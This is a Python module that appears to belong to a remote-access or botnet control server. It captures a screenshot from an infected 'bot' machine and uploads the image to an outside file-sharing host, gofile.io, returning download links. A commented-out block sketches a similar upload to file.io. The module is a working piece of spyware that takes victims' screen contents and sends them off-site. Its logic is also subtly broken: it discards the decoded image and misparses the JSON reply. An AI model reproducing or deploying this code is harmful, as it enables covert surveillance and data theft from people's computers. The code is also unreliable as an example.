# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *
from base64 import b64decode
import json
import requests

class Module(ModuleABC):
    def get_info(self):
        return {
            "Author:": ["Marten4n6"],
            "Description": "Take a screenshot of the bot's screen.",
            "References": [],
            "Stoppable": False
        }

    def get_setup_messages(self):
        """
        returns: List
        first option is the Label in html
        second option is the name for which the post request will call for
        """
        return [
            ["Local output name (Leave empty for <RANDOM>): ","outputName"]
        ]

    def setup(self, set_options):
        output_name = set_options[0]

        if not output_name:
            output_name = random_string(8)

        return True, {
            "response_options": {
                "output_name": output_name
            }
        }

    
    def process_response(self, response, response_options):
        try:
            output_name = "{}.png".format(response_options["output_name"])
            data = b64decode(response.decode().split("'")[1].encode())
            url = 'https://cold7.gofile.io/contents/uploadfile'
            data = {
                "file": (output_name,response),
                }
            r = requests.post(url,data=data)
            jsonres = json.loads(r.json())
            status = jsonres['status']
            if status == "ok":
                fileId = jsonres['fileId']
                filename = jsonres['fileName']
                downloadpage = jsonres['downloadPage']
                directImage = f"https://cold7.gofile.io/download/web/{fileId}/{filename}"
                res = ""
                res = f"Direct Image Url:~ {directImage}"
                res += f"Download Page:~ {downloadpage}"
                res += f"File Id :~ {fileId}"
                res += f"Filename:~ {filename}\n\n"
                res += response.decode() +"\n\n\n\n\n"
                res += "----------"*20+"\n\n"
                return res
            else:
                return r.content
        except Exception as e:
            return str(e)
        

"""


url = 'https://file.io/'
data = {
    "file": open("myimage.png", "rb"),
    "maxDownloads": 100,
    "autoDelete": True
}
"""